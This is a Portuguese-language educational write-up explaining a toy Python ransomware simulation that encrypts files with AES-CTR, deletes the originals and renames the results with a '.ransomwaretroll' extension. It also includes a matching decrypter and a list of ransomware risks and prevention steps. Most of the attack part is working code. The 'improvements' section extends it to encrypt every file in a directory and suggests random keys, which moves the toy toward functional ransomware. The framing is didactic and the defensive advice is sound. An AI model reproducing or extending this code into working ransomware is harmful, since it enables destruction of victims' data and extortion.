# Documento: Análise e Automação de Código de Criptografia/Descriptografia (Ransomware)

## Introdução

Este documento tem como objetivo fornecer uma explicação detalhada do funcionamento de um código simples que simula um ataque de *ransomware*, com a criptografia e descriptografia de arquivos. Também discutiremos como melhorar esse código para automação, exemplos de entrada e saída, além de abordar as ferramentas utilizadas, os riscos relacionados a ataques do tipo ransomware e medidas para mitigar esses riscos.

O ransomware é um tipo de malware que criptografa os dados do usuário e exige um resgate (normalmente em criptomoeda) para fornecer a chave de descriptografia. Este código serve como um exemplo didático para entender como funcionam esses ataques.

## Ferramentas Utilizadas

- **Python**: Linguagem de programação utilizada para implementar os scripts.
- **pyaes**: Biblioteca Python usada para criptografia AES (Advanced Encryption Standard), com o modo de operação CTR (Counter Mode).
- **os**: Biblioteca padrão do Python utilizada para manipulação de arquivos e diretórios.

### Módulos Importados
- **os**: Permite o gerenciamento de arquivos, como abrir, ler, excluir e escrever arquivos.
- **pyaes**: Implementa a criptografia e descriptografia usando o algoritmo AES no modo CTR.

## Código - Explicação Detalhada

### Criptografador (`encripter.py`)

```python
import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
```

#### Passo a Passo:

1. **Abrir o arquivo a ser criptografado**: O arquivo `teste.txt` é aberto no modo de leitura binária (`rb`).
2. **Remover o arquivo original**: O arquivo original é excluído após a leitura dos dados para garantir que ele não esteja mais acessível.
3. **Criação da chave de criptografia**: A chave usada para criptografar os dados é definida como `b"testeransomwares"`, que é uma string de 16 bytes.
4. **Criptografar o arquivo**: A criptografia é realizada usando o modo CTR do AES. A função `aes.encrypt(file_data)` criptografa os dados lidos do arquivo.
5. **Salvar o arquivo criptografado**: O arquivo criptografado é salvo com a extensão `.ransomwaretroll`, tornando-o ilegível sem a chave de descriptografia.

### Descriptografador (`decripter.py`)

```python
import os
import pyaes

# Abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

# Remover o arquivo criptografado
os.remove(file_name)

# Criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```

#### Passo a Passo:

1. **Abrir o arquivo criptografado**: O arquivo criptografado `teste.txt.ransomwaretroll` é aberto no modo binário para leitura.
2. **Descriptografar o arquivo**: A chave `b"testeransomwares"` é usada para descriptografar os dados utilizando o modo CTR do AES. A função `aes.decrypt(file_data)` faz a descriptografia.
3. **Remover o arquivo criptografado**: Após a descriptografia, o arquivo criptografado é excluído.
4. **Salvar o arquivo descriptografado**: O arquivo é salvo novamente com o nome original `teste.txt`.

## Exemplos de Entrada e Saída

### Entrada:

- Arquivo original: `teste.txt`, que contém o seguinte texto:
  ```
  Olá, este é um teste de criptografia!
  ```

### Saída após execução do `encripter.py`:

- Arquivo criptografado: `teste.txt.ransomwaretroll` (os dados agora são irreconhecíveis, pois estão criptografados).

### Saída após execução do `decripter.py`:

- Arquivo descriptografado: `teste.txt`, com o conteúdo original:
  ```
  Olá, este é um teste de criptografia!
  ```

## Melhorias e Automação

Para tornar o processo de criptografia e descriptografia mais automatizado e eficiente, algumas melhorias podem ser feitas:

1. **Automação do Processo com Diretórios**: É possível modificar o código para criptografar todos os arquivos em um diretório e, posteriormente, descriptografá-los de forma automatizada.
   
   Exemplo:
   ```python
   import os
   import pyaes

   def encrypt_directory(directory_path):
       for filename in os.listdir(directory_path):
           file_path = os.path.join(directory_path, filename)
           if os.path.isfile(file_path):
               encrypt_file(file_path)

   def encrypt_file(file_path):
       with open(file_path, 'rb') as file:
           file_data = file.read()
       
       os.remove(file_path)

       key = b"testeransomwares"
       aes = pyaes.AESModeOfOperationCTR(key)
       encrypted_data = aes.encrypt(file_data)

       new_file_path = file_path + ".ransomwaretroll"
       with open(new_file_path, 'wb') as new_file:
           new_file.write(encrypted_data)
   ```

2. **Logs de Ações**: Adicionar logs para monitorar o que está acontecendo durante o processo de criptografia/descriptografia, o que ajudaria em auditorias ou na recuperação de arquivos.

3. **Geração Automática de Chaves**: Em vez de usar uma chave fixa como `b"testeransomwares"`, pode-se gerar uma chave aleatória para maior segurança.

4. **Descriptografar em Massa**: Implementar uma função para descriptografar vários arquivos de uma vez, similar ao processo de criptografia, mas em sentido inverso.

## Riscos de Ataques Ransomware

### Como Funcionam os Ransomwares?

Os ransomwares, como demonstrado neste código, criptografam arquivos e exigem um resgate (normalmente em criptomoeda) para fornecer a chave que os descriptografa. Eles podem ser espalhados por e-mail (phishing), sites comprometidos, ou outros métodos, colocando em risco dados sensíveis.

### Riscos:

- **Perda de Dados**: Caso o resgate não seja pago ou o atacante não seja confiável, os dados podem ser perdidos permanentemente.
- **Custos Financeiros**: Além do resgate, podem haver custos adicionais para restaurar ou recuperar os dados.
- **Interrupção Operacional**: O impacto nos sistemas pode ser severo, afetando empresas, governos ou usuários.

## Como Evitar Ataques de Ransomware?

1. **Backups Regulares**: Manter backups atualizados em locais seguros, como na nuvem ou em dispositivos físicos desconectados da rede, é crucial.
2. **Antivírus e Firewalls**: Usar antivírus confiáveis e manter firewalls configurados corretamente.
3. **Atualizações de Sistema e Software**: Manter o sistema operacional e os aplicativos atualizados para corrigir vulnerabilidades de segurança.
4. **Educação e Treinamento**: Treinar os usuários para reconhecerem e-mails suspeitos e links fraudulentos que podem conter ransomwares.
5. **Uso de Criptografia de Arquivos Sensíveis**: Criptografar dados sensíveis em repouso para proteger as informações, mesmo que um atacante tenha acesso aos arquivos.

## Conclusão

Este código oferece uma visão simples e didática sobre como o ransomware pode ser implementado e também como ele pode ser reversível por meio de descriptografia. Contudo, os riscos são altos, e a prevenção é a chave para proteger dados contra ataques desse tipo. Implementar boas práticas de segurança cibernética pode minimizar os danos em caso de ataque.
